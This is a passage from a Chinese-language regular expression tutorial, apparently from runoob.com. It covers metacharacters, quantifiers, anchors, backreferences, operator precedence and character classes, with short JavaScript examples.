			abc$匹配字母 abc 并以 abc 结尾，$ 为匹配输入字符串的结束位置。
		实例
			匹配以数字开头，并以 abc 结尾的字符串。：
			var str = "123abc";
			var patt1 = /^[0-9]+abc$/;
			document.write(str.match(patt1));

		以下标记的文本是获得的匹配的表达式：
			123abc

		为什么使用正则表达式？

		典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。

		通过使用正则表达式，可以：

			测试字符串内的模式。
			例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。
			替换文本。
			可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。
			基于模式匹配从字符串中提取子字符串。
			可以查找文档内或输入域内特定的文本。

		例如，您可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML 格式标记。在这种情况下，可以使用正则表达式来确定在每个文件中是否出现该材料或该 HTML 格式标记。此过程将受影响的文件列表缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过时的材料。最后，可以使用正则表达式来搜索和替换标记。
		发展历史

		正则表达式的"祖先"可以一直上溯至对人类神经系统如何工作的早期研究。Warren McCulloch 和 Walter Pitts 这两位神经生理学家研究出一种数学方式来描述这些神经网络。

		1956 年, 一位叫 Stephen Kleene 的数学家在 McCulloch 和 Pitts 早期工作的基础上，发表了一篇标题为"神经网事件的表示法"的论文，引入了正则表达式的概念。正则表达式就是用来描述他称为"正则集的代数"的表达式，因此采用"正则表达式"这个术语。

		随后，发现可以将这一工作应用于使用 Ken Thompson 的计算搜索算法的一些早期研究，Ken Thompson 是 Unix 的主要发明人。正则表达式的第一个实用应用程序就是 Unix 中的 qed 编辑器。

		如他们所说，剩下的就是众所周知的历史了。从那时起直至现在正则表达式都是基于文本的编辑器和搜索工具中的一个重要部分。
		应用领域

		目前，正则表达式已经在很多软件中得到广泛的应用，包括 *nix（Linux, Unix等）、HP 等操作系统，PHP、C#、Java 等开发环境，以及很多的应用软件中，都可以看到正则表达式的影子。
		C# 正则表达式

		在我们的 C# 教程中，C# 正则表达式 这一章节专门介绍了有关 C# 正则表达式的知识。
		Java 正则表达式

		在我们的 Java 教程中，Java 正则表达式 这一章节专门介绍了有关 Java 正则表达式的知识。
		JavaScript 正则表达式

		在我们的 JavaScript 教程中，JavaScript RegExp 对象 这一章节专门介绍了有关 JavaScript 正则表达式的知识，同时我们还提供了完整的 JavaScript RegExp 对象参考手册。
		Python 正则表达式

		在我们的 Python 基础教程中，Python 正则表达式 这一章节专门介绍了有关 Python 正则表达式的知识。
		Ruby 正则表达式

		在我们的 Ruby 教程中，Ruby 正则表达式 这一章节专门介绍了有关 Ruby 正则表达式的知识。
		命令或环境 	. 	[ ] 	^ 	$ 	\( \) 	\{ \} 	? 	+ 	| 	( )
		vi 	√ 	√ 	√ 	√ 	√ 	　	　	　	　	　
		Visual C++ 	√ 	√ 	√ 	√ 	√ 	　	　	　	　	　
		awk 	√ 	√ 	√ 	√ 	　	awk是支持该语法的，只是要在命令 行加入 --posix or --re-interval参数即可，可见 man awk中的interval expression 	√ 	√ 	√ 	√
		sed 	√ 	√ 	√ 	√ 	√ 	√ 	　	　	　	　
		delphi 	√ 	√ 	√ 	√ 	√ 	　	√ 	√ 	√ 	√
		python 	√ 	√ 	√ 	√ 	√ 	√ 	√	√	√	√
		java 	√ 	√ 	√ 	√ 	√ 	√ 	√	√	√　	√　
		javascript 	√ 	√ 	√ 	√ 	√ 	　	√ 	√ 	√ 	√
		php 	√ 	√ 	√ 	√ 	√ 	　	　	　	　	　
		perl 	√ 	√ 	√ 	√ 	√ 	　	√ 	√ 	√ 	√
		C# 	√ 	√ 	√ 	√ 	　	　	√ 	√ 	√ 	√ 
		
	
	正则表达式 - 语法

		正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。

		例如：

			runoo+b，可以匹配 runoob、runooob、runoooooob 等，+ 号代表前面的字符必须至少出现一次（1次或多次）。

			runoo*b，可以匹配 runob、runoob、runoooooob 等，* 号代表字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。

			colou?r 可以匹配 color 或者 colour，? 问号代表前面的字符最多只可以出现一次（0次、或1次）。 

		构造正则表达式的方法和创建数学表达式的方法一样。也就是用多种元字符与运算符可以将小的表达式结合在一起来创建更大的表达式。正则表达式的组件可以是单个的字符、字符集合、字符范围、字符间的选择或者所有这些组件的任意组合。
		正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为"元字符"）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。
		普通字符
			普通字符包括没有显式指定为元字符的所有可打印和不可打印字符。这包括所有大写和小写字母、所有数字、所有标点符号和一些其他符号。
		
		非打印字符
			非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：
			字符 	描述
			\cx 	匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。
			\f 	匹配一个换页符。等价于 \x0c 和 \cL。
			\n 	匹配一个换行符。等价于 \x0a 和 \cJ。
			\r 	匹配一个回车符。等价于 \x0d 和 \cM。
			\s 	匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。
			\S 	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
			\t 	匹配一个制表符。等价于 \x09 和 \cI。
			\v 	匹配一个垂直制表符。等价于 \x0b 和 \cK。
		
		特殊字符
			所谓特殊字符，就是一些有特殊含义的字符，如上面说的 runoo*b 中的 *，简单的说就是表示任何字符串的意思。如果要查找字符串中的 * 符号，则需要对 * 进行转义，即在其前加一个 \: runo\*ob 匹配 runo*ob。
			许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符"转义"，即，将反斜杠字符\ 放在它们前面。下表列出了正则表达式中的特殊字符：
				特别字符 	描述
				$ 	匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 '\n' 或 '\r'。要匹配 $ 字符本身，请使用 \$。
				( ) 	标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)。
				* 	匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。
				+ 	匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。
				. 	匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。
				[ 	标记一个中括号表达式的开始。要匹配 [，请使用 \[。
				? 	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。
				\ 	将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， 'n' 匹配字符 'n'。'\n' 匹配换行符。序列 '\\' 匹配 "\"，而 '\(' 则匹配 "("。
				^ 	匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 \^。
				{ 	标记限定符表达式的开始。要匹配 {，请使用 \{。
				| 	指明两项之间的一个选择。要匹配 |，请使用 \|。
		限定符
			限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。

			正则表达式的限定符有：
			字符 	描述
			* 	匹配前面的子表达式零次或多次。例如，zo* 能匹配 "z" 以及 "zoo"。* 等价于{0,}。
			+ 	匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。
			? 	匹配前面的子表达式零次或一次。例如，"do(es)?" 可以匹配 "do" 或 "does" 中的 "does" 或 "doxy" 中的 "do" 。? 等价于 {0,1}。
			{n} 	n 是一个非负整数。匹配确定的 n 次。例如，'o{2}' 不能匹配 "Bob" 中的 'o'，但是能匹配 "food" 中的两个 o。
			{n,} 	n 是一个非负整数。至少匹配n 次。例如，'o{2,}' 不能匹配 "Bob" 中的 'o'，但能匹配 "foooood" 中的所有 o。'o{1,}' 等价于 'o+'。'o{0,}' 则等价于 'o*'。
			{n,m} 	m 和 n 均为非负整数，其中n <= m。最少匹配 n 次且最多匹配 m 次。例如，"o{1,3}" 将匹配 "fooooood" 中的前三个 o。'o{0,1}' 等价于 'o?'。请注意在逗号和两个数之间不能有空格。

			由于章节编号在大的输入文档中会很可能超过九，所以您需要一种方式来处理两位或三位章节编号。限定符给您这种能力。下面的正则表达式匹配编号为任何位数的章节标题：

			/Chapter [1-9][0-9]*/

			请注意，限定符出现在范围表达式之后。因此，它应用于整个范围表达式，在本例中，只指定从 0 到 9 的数字（包括 0 和 9）。

			这里不使用 + 限定符，因为在第二个位置或后面的位置不一定需要有一个数字。也不使用？字符，因为它将章节编号限制到只有两位数。您需要至少匹配 Chapter 和空格字符后面的一个数字。

			如果您知道章节编号被限制为只有 99 章，可以使用下面的表达式来至少指定一位但至多两位数字。

			/Chapter [0-9]{1,2}/

			上面的表达式的缺点是，大于 99 的章节编号仍只匹配开头两位数字。另一个缺点是 Chapter 0 也将匹配。只匹配两位数字的更好的表达式如下：

			/Chapter [1-9][0-9]?/

			或

			/Chapter [1-9][0-9]{0,1}/

			*、+和?限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个?就可以实现非贪婪或最小匹配。

			例如，您可能搜索 HTML 文档，以查找括在 H1 标记内的章节标题。该文本在您的文档中如下：

			<H1>Chapter 1 - 介绍正则表达式</H1>

			贪婪：下面的表达式匹配从开始小于符号 (<) 到关闭 H1 标记的大于符号 (>) 之间的所有内容。

			/<.*>/

			非贪婪：如果您只需要匹配开始和结束 H1 标签，下面的非贪婪表达式只匹配 <H1>。

			/<.*?>/

			如果只想匹配开始的 H1 标签，表达式则是：

			/<\w+?>/

			通过在 *、+ 或 ? 限定符之后放置 ?，该表达式从"贪心"表达式转换为"非贪心"表达式或者最小匹配。
			
		定位符
			定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。
			定位符用来描述字符串或单词的边界，^ 和 $ 分别指字符串的开始与结束，\b 描述单词的前或后边界，\B 表示非单词边界。

			正则表达式的定位符有：
			字符 	描述
			^ 	匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。
			$ 	匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。
			\b 	匹配一个字边界，即字与空格间的位置。
			\B 	非字边界匹配。

			注意：不能将限定符与定位符一起使用。由于在紧靠换行或者字边界的前面或后面不能有一个以上位置，因此不允许诸如 ^* 之类的表达式。

			若要匹配一行文本开始处的文本，请在正则表达式的开始使用 ^ 字符。不要将 ^ 的这种用法与中括号表达式内的用法混淆。

			若要匹配一行文本的结束处的文本，请在正则表达式的结束处使用 $ 字符。

			若要在搜索章节标题时使用定位点，下面的正则表达式匹配一个章节标题，该标题只包含两个尾随数字，并且出现在行首：
				/^Chapter [1-9][0-9]{0,1}/
			真正的章节标题不仅出现行的开始处，而且它还是该行中仅有的文本。它即出现在行首又出现在同一行的结尾。
			下面的表达式能确保指定的匹配只匹配章节而不匹配交叉引用。通过创建只匹配一行文本的开始和结尾的正则表达式，就可做到这一点。
				/^Chapter [1-9][0-9]{0,1}$/
			匹配字边界稍有不同，但向正则表达式添加了很重要的能力。字边界是单词和空格之间的位置。非字边界是任何其他位置。下面的表达式匹配单词 Chapter 的开头三个字符，因为这三个字符出现字边界后面：

			/\bCha/

			\b 字符的位置是非常重要的。如果它位于要匹配的字符串的开始，它在单词的开始处查找匹配项。如果它位于字符串的结尾，它在单词的结尾处查找匹配项。例如，下面的表达式匹配单词 Chapter 中的字符串 ter，因为它出现在字边界的前面：

			/ter\b/

			下面的表达式匹配 Chapter 中的字符串 apt，但不匹配 aptitude 中的字符串 apt：

			/\Bapt/

			字符串 apt 出现在单词 Chapter 中的非字边界处，但出现在单词 aptitude 中的字边界处。对于 \B 非字边界运算符，位置并不重要，因为匹配不关心究竟是单词的开头还是结尾。
			选择

			用圆括号将所有选择项括起来，相邻的选择项之间用|分隔。但用圆括号会有一个副作用，是相关的匹配会被缓存，此时可用?:放在第一个选项前来消除这种副作用。

			其中 ?: 是非捕获元之一，还有两个非捕获元是 ?= 和 ?!，这两个还有更多的含义，前者为正向预查，在任何开始匹配圆括号内的正则表达式模式的位置来匹配搜索字符串，后者为负向预查，在任何开始不匹配该正则表达式模式的位置来匹配搜索字符串。
			反向引用

			对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 \n 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

			可以使用非捕获元字符 ?:、?= 或 ?! 来重写捕获，忽略对相关匹配的保存。

			反向引用的最简单的、最有用的应用之一，是提供查找文本中两个相同的相邻单词的匹配项的能力。以下面的句子为例：

			Is is the cost of of gasoline going up up?

			上面的句子很显然有多个重复的单词。如果能设计一种方法定位该句子，而不必查找每个单词的重复出现，那该有多好。下面的正则表达式使用单个子表达式来实现这一点：
			实例

			查找重复的单词：
			var str = "Is is the cost of of gasoline going up up";
			var patt1 = /\b([a-z]+) \1\b/ig;
			document.write(str.match(patt1));

			捕获的表达式，正如 [a-z]+ 指定的，包括一个或多个字母。正则表达式的第二部分是对以前捕获的子匹配项的引用，即，单词的第二个匹配项正好由括号表达式匹配。\1 指定第一个子匹配项。

			字边界元字符确保只检测整个单词。否则，诸如 "is issued" 或 "this is" 之类的词组将不能正确地被此表达式识别。

			正则表达式后面的全局标记 g 指定将该表达式应用到输入字符串中能够查找到的尽可能多的匹配。

			表达式的结尾处的不区分大小写 i 标记指定不区分大小写。

			多行标记指定换行符的两边可能出现潜在的匹配。

		反向引用
			反向引用还可以将通用资源指示符 (URI) 分解为其组件。假定您想将下面的 URI 分解为协议（ftp、http 等等）、域地址和页/路径：

			http://www.runoob.com:80/html/html-tutorial.html

			下面的正则表达式提供该功能：
			实例

			输出所有匹配的数据：
			var str = "http://www.runoob.com:80/html/html-tutorial.html";
			var patt1 = /(\w+):\/\/([^/:]+)(:\d*)?([^# ]*)/;
			arr = str.match(patt1);
			for (var i = 0; i < arr.length ; i++) {
				document.write(arr[i]);
				document.write("<br>");
			}


			第一个括号子表达式捕获 Web 地址的协议部分。该子表达式匹配在冒号和两个正斜杠前面的任何单词。
			第二个括号子表达式捕获地址的域地址部分。子表达式匹配 / 和 : 之外的一个或多个字符。
			第三个括号子表达式捕获端口号（如果指定了的话）。该子表达式匹配冒号后面的零个或多个数字。只能重复一次该子表达式。
			最后，第四个括号子表达式捕获 Web 地址指定的路径和 / 或页信息。该子表达式能匹配不包括 # 或空格字符的任何字符序列。
			
			将正则表达式应用到上面的 URI，各子匹配项包含下面的内容：
				第一个括号子表达式包含"http"
				第二个括号子表达式包含"www.runoob.com"
				第三个括号子表达式包含":80"
				第四个括号子表达式包含"/html/html-tutorial.html"

	正则表达式 - 元字符
		下表包含了元字符的完整列表以及它们在正则表达式上下文中的行为：
		字符 	描述
		\ 		将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，'n' 匹配字符 "n"。'\n' 匹配一个换行符。序列 '\\' 匹配 "\" 而 "\(" 则匹配 "("。
		^ 		匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 '\n' 或 '\r' 之后的位置。
		$ 		匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 '\n' 或 '\r' 之前的位置。
		* 		匹配前面的子表达式零次或多次。例如，zo* 能匹配 "z" 以及 "zoo"。* 等价于{0,}。
		+ 		匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。
		? 		匹配前面的子表达式零次或一次。例如，"do(es)?" 可以匹配 "do" 或 "does" 。? 等价于 {0,1}。
		{n} 	n 是一个非负整数。匹配确定的 n 次。例如，'o{2}' 不能匹配 "Bob" 中的 'o'，但是能匹配 "food" 中的两个 o。
		{n,} 	n 是一个非负整数。至少匹配n 次。例如，'o{2,}' 不能匹配 "Bob" 中的 'o'，但能匹配 "foooood" 中的所有 o。'o{1,}' 等价于 'o+'。'o{0,}' 则等价于 'o*'。
		{n,m} 	m 和 n 均为非负整数，其中n <= m。最少匹配 n 次且最多匹配 m 次。例如，"o{1,3}" 将匹配 "fooooood" 中的前三个 o。'o{0,1}' 等价于 'o?'。请注意在逗号和两个数之间不能有空格。
		? 		当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。例如，对于字符串 "oooo"，'o+?' 将匹配单个 "o"，而 'o+' 将匹配所有 'o'。
		. 		匹配除 "\n" 之外的任何单个字符。要匹配包括 '\n' 在内的任何字符，请使用像"(.|\n)"的模式。
		(pattern) 	匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 '\(' 或 '\)'。
		(?:pattern) 匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 "或" 字符 (|) 来组合一个模式的各个部分是很有用。例如， 'industr(?:y|ies) 就是一个比 'industry|industries' 更简略的表达式。
		(?=pattern) 正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，'Windows (?=95|98|NT|2000)' 能匹配 "Windows 2000" 中的 "Windows" ，但不能匹配 "Windows 3.1" 中的 "Windows"。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。
		(?!pattern) 负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如'Windows (?!95|98|NT|2000)' 能匹配 "Windows 3.1" 中的 "Windows"，但不能匹配 "Windows 2000" 中的 "Windows"。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。
		x|y 	匹配 x 或 y。例如，'z|food' 能匹配 "z" 或 "food"。'(z|f)ood' 则匹配 "zood" 或 "food"。
		[xyz] 	字符集合。匹配所包含的任意一个字符。例如， '[abc]' 可以匹配 "plain" 中的 'a'。
		[^xyz] 	负值字符集合。匹配未包含的任意字符。例如， '[^abc]' 可以匹配 "plain" 中的'p'、'l'、'i'、'n'。
		[a-z] 	字符范围。匹配指定范围内的任意字符。例如，'[a-z]' 可以匹配 'a' 到 'z' 范围内的任意小写字母字符。
		[^a-z] 	负值字符范围。匹配任何不在指定范围内的任意字符。例如，'[^a-z]' 可以匹配任何不在 'a' 到 'z' 范围内的任意字符。
		\b 		匹配一个单词边界，也就是指单词和空格间的位置。例如， 'er\b' 可以匹配"never" 中的 'er'，但不能匹配 "verb" 中的 'er'。
		\B 		匹配非单词边界。'er\B' 能匹配 "verb" 中的 'er'，但不能匹配 "never" 中的 'er'。
		\cx 	匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。
		\d 		匹配一个数字字符。等价于 [0-9]。
		\D 		匹配一个非数字字符。等价于 [^0-9]。
		\f 		匹配一个换页符。等价于 \x0c 和 \cL。
		\n 		匹配一个换行符。等价于 \x0a 和 \cJ。
		\r 		匹配一个回车符。等价于 \x0d 和 \cM。
		\s 		匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。
		\S 		匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
		\t 		匹配一个制表符。等价于 \x09 和 \cI。
		\v 		匹配一个垂直制表符。等价于 \x0b 和 \cK。
		\w 		匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。
		\W 		匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。
		\xn 	匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，'\x41' 匹配 "A"。'\x041' 则等价于 '\x04' & "1"。正则表达式中可以使用 ASCII 编码。
		\num 	匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，'(.)\1' 匹配两个连续的相同字符。
		\n 		标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。
		\nm 	标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。
		\nml 	如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。
		\un 	匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。

	正则表达式 - 运算符优先级
		正则表达式从左到右进行计算，并遵循优先级顺序，这与算术表达式非常类似。
		相同优先级的从左到右进行运算，不同优先级的运算先高后低。下表从最高到最低说明了各种正则表达式运算符的优先级顺序：
		运算符 								描述
		\ 									转义符
		(), (?:), (?=), [] 					圆括号和方括号
		*, +, ?, {n}, {n,}, {n,m} 			限定符
		^, $, \任何元字符、任何字符 		定位点和序列（即：位置和顺序）
		| 									替换，"或"操作，字符具有高于替换运算符的优先级，使得"m|food"匹配"m"或"food"。若要匹配"mood"或"food"，请使用括号创建子表达式，从而产生"(m|f)ood"。 
		
	
	正则表达式 - 匹配规则
		基本模式匹配
			一切从最基本的开始。模式，是正规表达式最基本的元素，它们是一组描述字符串特征的字符。模式可以很简单，由普通的字符串组成，也可以非常复杂，往往用特殊的字符表示一个范围内的字符、重复出现，或表示上下文。例如：
			^once
			这个模式包含一个特殊的字符^，表示该模式只匹配那些以once开头的字符串。例如该模式与字符串"once upon a time"匹配，与"There once was a man from NewYork"不匹配。正如如^符号表示开头一样，$符号用来匹配那些以给定模式结尾的字符串。

			bucket$
			这个模式与"Who kept all of this cash in a bucket"匹配，与"buckets"不匹配。字符^和$同时使用时，表示精确匹配（字符串与模式一样）。例如：

			^bucket$
			只匹配字符串"bucket"。如果一个模式不包括^和$，那么它与任何包含该模式的字符串匹配。例如：模式

			once与字符串There once was a man from NewYork，Who kept all of his cash in a bucket.是匹配的。

			在该模式中的字母(o-n-c-e)是字面的字符，也就是说，他们表示该字母本身，数字也是一样的。其他一些稍微复杂的字符，如标点符号和白字符（空格、制表符等），要用到转义序列。所有的转义序列都用反斜杠(\)打头。制表符的转义序列是：\t。所以如果我们要检测一个字符串是否以制表符开头，可以用这个模式：
			^\t 

			类似的，用\n表示"新行"，\r表示回车。其他的特殊符号，可以用在前面加上反斜杠，如反斜杠本身用\\表示，句号.用\.表示，以此类推。
		
		字符簇
			在INTERNET的程序中，正规表达式通常用来验证用户的输入。当用户提交一个FORM以后，要判断输入的电话号码、地址、EMAIL地址、信用卡号码等是否有效，用普通的基于字面的字符是不够的。
			所以要用一种更自由的描述我们要的模式的办法，它就是字符簇。要建立一个表示所有元音字符的字符簇，就把所有的元音字符放在一个方括号里：
				[AaEeIiOoUu]这个模式与任何元音字符匹配，但只能表示一个字符。
				用连字号可以表示一个字符的范围，如：
					[a-z] //匹配所有的小写字母 
					[A-Z] //匹配所有的大写字母 
					[a-zA-Z] //匹配所有的字母 
					[0-9] //匹配所有的数字 
					[0-9\.\-] //匹配所有的数字，句号和减号 
					[ \f\r\t\n] //匹配所有的白字符
				同样的，这些也只表示一个字符，这是一个非常重要的。如果要匹配一个由一个小写字母和一位数字组成的字符串，比如"z2"、"t6"或"g7"，但不是"ab2"、"r2d3" 或"b52"的话，用这个模式：
					^[a-z][0-9]$
				尽管[a-z]代表26个字母的范围，但在这里它只能与第一个字符是小写字母的字符串匹配。

			前面曾经提到^表示字符串的开头，但它还有另外一个含义。当在一组方括号里使用^是，它表示"非"或"排除"的意思，常常用来剔除某个字符。还用前面的例子，我们要求第一个字符不能是数字：
				^[^0-9][0-9]$
			这个模式与"&5"、"g7"及"-2"是匹配的，但与"12"、"66"是不匹配的。下面是几个排除特定字符的例子：
				[^a-z] //除了小写字母以外的所有字符 
				[^\\\/\^] //除了(\)(/)(^)之外的所有字符 
				[^\"\'] //除了双引号(")和单引号(')之外的所有字符

			特殊字符"." (点，句号)在正则表达式中用来表示除了"新行"之外的所有字符。所以模式"^.5$"与任何两个字符的、以数字5结尾和以其他非"新行"字符开头的字符串匹配。模式"."可以匹配任何字符串，除了空串和只包括一个"新行"的字符串。

			PHP的正规表达式有一些内置的通用字符簇，列表如下：
			字符簇 	描述
			[[:alpha:]] 	任何字母
			[[:digit:]] 	任何数字
			[[:alnum:]] 	任何字母和数字
			[[:space:]] 	任何空白字符
			[[:upper:]] 	任何大写字母
			[[:lower:]] 	任何小写字母
			[[:punct:]] 	任何标点符号
			[[:xdigit:]] 	任何16进制的数字，相当于[0-9a-fA-F]

		确定重复出现
			到现在为止，你已经知道如何去匹配一个字母或数字，但更多的情况下，可能要匹配一个单词或一组数字。一个单词有若干个字母组成，一组数字有若干个单数组成。跟在字符或字符簇后面的花括号({})用来确定前面的内容的重复出现的次数。
			字符簇 					描述
			^[a-zA-Z_]$ 		所有的字母和下划线
			^[[:alpha:]]{3}$ 	所有的3个字母的单词
			^a$ 				字母a
			^a{4}$ 				aaaa
			^a{2,4}$ 			aa,aaa或aaaa
			^a{1,3}$ 			a,aa或aaa
			^a{2,}$ 			包含多于两个a的字符串
			^a{2,} 				如：aardvark和aaab，但apple不行
			a{2,} 				如：baad和aaa，但Nantucket不行
			\t{2} 				两个制表符
			.{2} 				所有的两个字符
	
			这些例子描述了花括号的三种不同的用法。一个数字 {x} 的意思是前面的字符或字符簇只出现x次 ；一个数字加逗号 {x,} 的意思是前面的内容出现x或更多的次数 ；两个数字用逗号分隔的数字 {x,y} 表示 前面的内容至少出现x次，但不超过y次。
			我们可以把模式扩展到更多的单词或数字：
				^[a-zA-Z0-9_]{1,}$      // 所有包含一个以上的字母、数字或下划线的字符串 
				^[1-9][0-9]{0,}$        // 所有的正整数 
				^\-{0,1}[0-9]{1,}$      // 所有的整数 
				^[-]?[0-9]+\.?[0-9]+$   // 所有的浮点数
			最后一个例子不太好理解，是吗？这么看吧：以一个可选的负号 ([-]?) 开头 (^)、跟着1个或更多的数字([0-9]+)、和一个小数点(\.)再跟上1个或多个数字([0-9]+)，并且后面没有其他任何东西($)。下面你将知道能够使用的更为简单的方法。

			特殊字符 ? 与 {0,1} 是相等的，它们都代表着： 0个或1个前面的内容 或 前面的内容是可选的 。所以刚才的例子可以简化为：
			^\-?[0-9]{1,}\.?[0-9]{1,}$
			
			特殊字符 * 与 {0,} 是相等的，它们都代表着 0 个或多个前面的内容 。最后，字符 + 与 {1,} 是相等的，表示 1 个或多个前面的内容 ，所以上面的4个例子可以写成：
			
			^[a-zA-Z0-9_]+$      // 所有包含一个以上的字母、数字或下划线的字符串 
			^[1-9][0-9]*$        // 所有的正整数 
			^\-?[0-9]+$          // 所有的整数 
			^\-?[0-9]+\.?[0-9]*$ // 所有的浮点数

			当然这并不能从技术上降低正规表达式的复杂性，但可以使它们更容易阅读。

	正则表达式 - 示例
		简单表达式

		正则表达式的最简单形式是在搜索字符串中匹配其本身的单个普通字符。例如，单字符模式，如 A，不论出现在搜索字符串中的何处，它总是匹配字母 A。下面是一些单字符正则表达式模式的示例：

		/a/
		/7/
		/M/

		可以将许多单字符组合起来以形成大的表达式。例如，以下正则表达式组合了单字符表达式：a、7 和 M。

		/a7M/

		请注意，没有串联运算符。只须在一个字符后面键入另一个字符。
		字符匹配

		句点 (.) 匹配字符串中的各种打印或非打印字符，只有一个字符例外。这个例外就是换行符 (\n)。下面的正则表达式匹配 aac、abc、acc、adc 等等，以及 a1c、a2c、a-c 和 a#c：

		/a.c/

		若要匹配包含文件名的字符串，而句点 (.) 是输入字符串的组成部分，请在正则表达式中的句点前面加反斜扛 (\) 字符。举例来说明，下面的正则表达式匹配 filename.ext：

		/filename\.ext/

		这些表达式只让您匹配"任何"单个字符。可能需要匹配列表中的特定字符组。例如，可能需要查找用数字表示的章节标题（Chapter 1、Chapter 2 等等）。
		中括号表达式

		若要创建匹配字符组的一个列表，请在方括号（[ 和 ]）内放置一个或更多单个字符。当字符括在中括号内时，该列表称为"中括号表达式"。与在任何别的位置一样，普通字符在中括号内表示其本身，即，它在输入文本中匹配一次其本身。大多数特殊字符在中括号表达式内出现时失去它们的意义。不过也有一些例外，如：

			如果 ] 字符不是第一项，它结束一个列表。若要匹配列表中的 ] 字符，请将它放在第一位，紧跟在开始 [ 后面。
			\ 字符继续作为转义符。若要匹配 \ 字符，请使用 \\。

		括在中括号表达式中的字符只匹配处于正则表达式中该位置的单个字符。以下正则表达式匹配 Chapter 1、Chapter 2、Chapter 3、Chapter 4 和 Chapter 5：

		/Chapter [12345]/

